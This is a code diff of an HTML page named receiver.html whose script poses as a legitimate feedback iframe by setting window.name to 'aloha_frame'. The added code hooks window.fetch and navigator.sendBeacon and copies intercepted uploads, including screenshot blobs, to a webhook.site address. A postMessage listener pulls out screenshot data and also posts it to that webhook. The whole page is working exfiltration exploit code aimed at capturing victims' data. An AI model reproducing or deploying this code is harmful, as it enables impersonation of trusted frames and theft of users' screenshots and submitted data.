@@ -3,9 +3,8 @@
   <body>
     <h2>receiver.html loaded</h2>
     <script>
-      window.name = "aloha_frame"; // Critical: impersonate the real feedback iframe
-
-      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with your webhook
+      window.name = "aloha_frame"; // Impersonate legitimate feedback iframe
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322";
 
       function deepFindScreenshot(obj) {
         const str = JSON.stringify(obj);
@@ -14,39 +13,58 @@
         return base64 ? base64[0] : (blob ? blob[0] : null);
       }
 
-      async function handleBinary(data) {
-        if (data instanceof Blob) {
-          console.log("🟢 Blob received");
-          const url = URL.createObjectURL(data);
-          const img = new Image();
-          img.src = url;
-          img.style = "max-width:100%;border:3px solid green";
-          document.body.appendChild(img);
-        } else if (data instanceof ArrayBuffer) {
-          console.log("🔵 ArrayBuffer received");
-          const blob = new Blob([data], { type: "image/png" });
-          const url = URL.createObjectURL(blob);
-          const img = new Image();
-          img.src = url;
-          img.style = "max-width:100%;border:3px solid blue";
-          document.body.appendChild(img);
-        } else if (typeof data === "object") {
-          const found = deepFindScreenshot(data);
-          if (found) {
-            const img = new Image();
-            img.src = found;
-            img.style = "max-width:100%;border:3px solid red";
-            document.body.appendChild(img);
-          }
-        }
+      async function displayBlob(data, color = "black") {
+        const url = URL.createObjectURL(data);
+        const img = new Image();
+        img.src = url;
+        img.style = `max-width:100%;border:3px solid ${color}`;
+        document.body.appendChild(img);
       }
+
+      // 🧲 Hook fetch
+      const _fetch = window.fetch;
+      window.fetch = async (...args) => {
+        const [url, opts] = args;
+        let body = opts?.body;
+
+        if (body instanceof Blob || body instanceof ArrayBuffer) {
+          console.log("📦 Intercepted fetch() binary upload:", url);
+          displayBlob(body, "purple");
+          navigator.sendBeacon(webhookURL, body);
+        } else if (body && typeof body === "object") {
+          console.log("📦 Intercepted fetch() object upload:", url);
+          navigator.sendBeacon(webhookURL, JSON.stringify(body));
+        }
+        return _fetch(...args);
+      };
+
+      // 🧲 Hook sendBeacon
+      const _sendBeacon = navigator.sendBeacon;
+      navigator.sendBeacon = (url, data) => {
+        console.log("📡 Intercepted sendBeacon:", url, data);
+        if (data instanceof Blob || data instanceof ArrayBuffer) {
+          displayBlob(data, "orange");
+        }
+        _sendBeacon(webhookURL, data);
+        return _sendBeacon(url, data);
+      };
 
       window.addEventListener("message", async (e) => {
         try {
           console.log("📩 postMessage from:", e.origin);
           console.log("🧾 Raw data:", e.data);
 
-          await handleBinary(e.data);
+          if (e.data instanceof Blob || e.data instanceof ArrayBuffer) {
+            displayBlob(e.data, "blue");
+          } else if (typeof e.data === "object") {
+            const found = deepFindScreenshot(e.data);
+            if (found) {
+              const img = new Image();
+              img.src = found;
+              img.style = "max-width:100%;border:3px solid red";
+              document.body.appendChild(img);
+            }
+          }
 
           fetch(webhookURL, {
             method: "POST",
